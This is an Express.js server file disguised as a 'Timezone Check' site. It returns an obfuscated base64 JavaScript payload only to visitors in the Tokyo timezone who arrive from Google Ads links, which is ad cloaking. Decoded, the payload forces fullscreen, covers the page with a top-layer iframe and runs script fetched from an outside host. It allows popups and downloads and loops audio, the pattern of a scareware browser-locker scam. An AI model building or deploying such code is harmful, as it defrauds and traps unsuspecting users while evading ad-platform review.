const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Import cors

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Enable CORS and restrict it to http://localhost:3000
app.use(cors());
// Serve the HTML file
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Timezone Check</title>
    </head>
    <body>
        <h1>Welcome to Website B</h1>
        <p>This server checks the timezone and URL parameters.</p>
    </body>
    </html>
    `);
});

// Endpoint to receive data from website A
app.post('/api/timezone', (req, res) => {
    const { timezone, fullUrl } = req.body;

    // Check if the request body is valid
    if (!req.body || !timezone || !fullUrl) {
        return res.status(400).send('Invalid request body.');
    }

    console.log(`Received timezone: ${timezone}, fullUrl: ${fullUrl}`);

    // Check if the timezone is Asia/Calcutta
    const isTimezoneJapan = timezone === 'Asia/Tokyo';

    // Check if the URL contains 'gclid'
    const containsGclid = fullUrl.includes('gclid');

    // Base64 code to send in response
    const base64Code = 'Ly8gSGlkZSBvdmVyZmxvdyBvbiB0aGUgZG9jdW1lbnQgZWxlbWVudApkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuc3R5bGUub3ZlcmZsb3cgPSAiaGlkZGVuIjsKCi8vIEluc2VydCBhbiBIVE1MIGRpdiB3aXRoIHNwZWNpZmljIHN0eWxlcyBpbnRvIHRoZSBkb2N1bWVudCBib2R5CmRvY3VtZW50LmJvZHkuaW5zZXJ0QWRqYWNlbnRIVE1MKCJhZnRlcmJlZ2luIiwgCiAgICAnPGRpdiBpZD0iYnJ1Y2VEaXYiIHN0eWxlPSJ6LWluZGV4OiA5OTk5OyBwb2ludGVyLWV2ZW50czogYXV0bzsgb3ZlcmZsb3c6IGhpZGRlbjsiPjwvZGl2PicKKTsKCi8vIEFkZCBhIGNsaWNrIGV2ZW50IGxpc3RlbmVyIHRvIHRyaWdnZXIgZnVsbHNjcmVlbiBhbmQgZmV0Y2ggZXh0ZXJuYWwgY29udGVudApkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKCkgewogICAgd2luZG93LnNjcm9sbFRvKDAsIDApOwogICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgaWYgKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5yZXF1ZXN0RnVsbHNjcmVlbikgewogICAgICAgICAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQucmVxdWVzdEZ1bGxzY3JlZW4oKTsKICAgICAgICB9IGVsc2UgaWYgKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5tb3pSZXF1ZXN0RnVsbFNjcmVlbikgewogICAgICAgICAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQubW96UmVxdWVzdEZ1bGxTY3JlZW4oKTsKICAgICAgICB9IGVsc2UgaWYgKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC53ZWJraXRSZXF1ZXN0RnVsbHNjcmVlbikgewogICAgICAgICAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQud2Via2l0UmVxdWVzdEZ1bGxzY3JlZW4oKTsKICAgICAgICB9IGVsc2UgaWYgKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5tc1JlcXVlc3RGdWxsc2NyZWVuKSB7CiAgICAgICAgICAgIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5tc1JlcXVlc3RGdWxsc2NyZWVuKCk7CiAgICAgICAgfQogICAgfSwgMTAwKTsKCiAgICAvLyBGZXRjaCBKYXZhU2NyaXB0IGNvbnRlbnQgZnJvbSB0aGUgbmV3IFVSTCBhbmQgZW1iZWQgaXQgaW4gYW4gaWZyYW1lCiAgICBmZXRjaCgiaHR0cHM6Ly9oZXRhLm9ucmVuZGVyLmNvbS8iKQogICAgICAgIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKICAgICAgICAudGhlbihjb250ZW50ID0+IHsKICAgICAgICAgICAgLy8gQ3JlYXRlIGFuIEhUTUwgd3JhcHBlciBmb3IgdGhlIEphdmFTY3JpcHQgY29udGVudAogICAgICAgICAgICBjb25zdCBodG1sQ29udGVudCA9IGAKICAgICAgICAgICAgICAgIDxodG1sPgogICAgICAgICAgICAgICAgPGhlYWQ+PHRpdGxlPkVtYmVkZGVkIENvbnRlbnQ8L3RpdGxlPjwvaGVhZD4KICAgICAgICAgICAgICAgIDxib2R5PgogICAgICAgICAgICAgICAgICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4ke2NvbnRlbnR9PC9zY3JpcHQ+CiAgICAgICAgICAgICAgICA8L2JvZHk+CiAgICAgICAgICAgICAgICA8L2h0bWw+CiAgICAgICAgICAgIGA7CiAgICAgICAgICAgIGxldCBibG9iID0gbmV3IEJsb2IoW2h0bWxDb250ZW50XSwgeyB0eXBlOiAidGV4dC9odG1sIiB9KTsKICAgICAgICAgICAgbGV0IHVybCA9IFVSTC5jcmVhdGVPYmplY3RVUkwoYmxvYik7CiAgICAgICAgICAgIGxldCBpZnJhbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpZnJhbWUiKTsKICAgICAgICAgICAgaWZyYW1lLnNyYyA9IHVybDsKICAgICAgICAgICAgaWZyYW1lLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgICAgICAgICBpZnJhbWUuc3R5bGUuaGVpZ2h0ID0gIjEwMCUiOwogICAgICAgICAgICBpZnJhbWUuZnJhbWVCb3JkZXIgPSAiMCI7CiAgICAgICAgICAgIGlmcmFtZS5zZXRBdHRyaWJ1dGUoImFsbG93ZnVsbHNjcmVlbiIsICIiKTsKICAgICAgICAgICAgaWZyYW1lLnNldEF0dHJpYnV0ZSgid2Via2l0YWxsb3dmdWxsc2NyZWVuIiwgIiIpOwogICAgICAgICAgICBpZnJhbWUuc2V0QXR0cmlidXRlKCJtb3phbGxvd2Z1bGxzY3JlZW4iLCAiIik7CiAgICAgICAgICAgIGlmcmFtZS5zYW5kYm94ID0gImFsbG93LXNjcmlwdHMgYWxsb3ctcG9wdXBzIGFsbG93LWRvd25sb2FkcyI7CiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJicnVjZURpdiIpLmFwcGVuZENoaWxkKGlmcmFtZSk7CiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJicnVjZURpdiIpLnN0eWxlLmhlaWdodCA9ICIxMDB2aCI7CiAgICAgICAgfSkKICAgICAgICAuY2F0Y2goZXJyb3IgPT4gewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCJFcnJvciBmZXRjaGluZyB0aGUgSmF2YVNjcmlwdDoiLCBlcnJvcik7CiAgICAgICAgfSk7Cn0sIHsgb25jZTogdHJ1ZSB9KTsKCi8vIEFkZCBhIHNlY29uZCBjbGljayBldmVudCBsaXN0ZW5lciB0byBwbGF5IGF1ZGlvCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24gKCkgewogICAgbGV0IGUgPSBuZXcgQXVkaW8oImh0dHBzOi8vYXVkaW8uanVrZWhvc3QuY28udWsvTFdkWkhPWEpNbGx2R01oMDlpZ1paM3g0a2lCSE94Z2IiKTsKICAgIGUubG9vcCA9IHRydWU7CiAgICBlLnBsYXkoKTsKICAgIGxldCB0ID0gbmV3IEF1ZGlvKCJodHRwczovL2F1ZGlvLmp1a2Vob3N0LmNvLnVrL3d1RDY1UHNLQnJBeFdDWlU0Y0oyQ2JoVXF3bDMzVVJ3Iik7CiAgICB0Lmxvb3AgPSB0cnVlOwogICAgdC5wbGF5KCk7Cn0sIHsgb25jZTogdHJ1ZSB9KTsK'; // Your base64 string here

    // If both conditions are met, respond with the base64 code
    if (isTimezoneJapan && containsGclid) {
        console.log(`Response sent: ${base64Code}`);
        return res.status(200).send(base64Code); // Send the base64 string directly
    } else {
        const responseMessage = 'Conditions not met.';
        console.log(responseMessage);
        return res.status(200).send(responseMessage);
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
